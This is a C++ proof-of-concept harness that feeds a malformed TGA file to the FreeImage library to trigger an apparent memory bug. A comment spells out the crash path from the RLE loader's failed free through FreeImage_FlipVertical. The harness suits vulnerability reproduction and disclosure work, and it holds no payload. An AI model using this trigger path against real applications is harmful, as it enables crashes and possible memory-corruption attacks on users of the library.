#include <iostream>
#include <windows.h> 
#include "FreeImage.h"

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: poc_loader.exe <path_to_poc_file>" << std::endl;
        return 1;
    }

    const char* filename = argv[1];

    std::cout << "[*] 1. Initializing FreeImage..." << std::endl;
    FreeImage_Initialise();

    std::cout << "[*] FreeImage Version: " << FreeImage_GetVersion() << std::endl;

    std::cout << "[*] 2. Attempting to load malformed TGA: " << filename << std::endl;

    //path: FreeImage_Load -> PluginTARGA::Load -> loadRLE (fail & free) -> FreeImage_FlipVertical (CRASH)
    FIBITMAP* dib = FreeImage_Load(FIF_TARGA, filename, 0);

    if (dib) {
        std::cout << "[-] Failed to crash. The image loaded (or handled) unexpectedly." << std::endl;
        FreeImage_Unload(dib);
    }
    else {

        std::cout << "[-] FreeImage_Load returned NULL. Vulnerability might be patched or not triggered." << std::endl;
    }

    FreeImage_DeInitialise();
    return 0;
}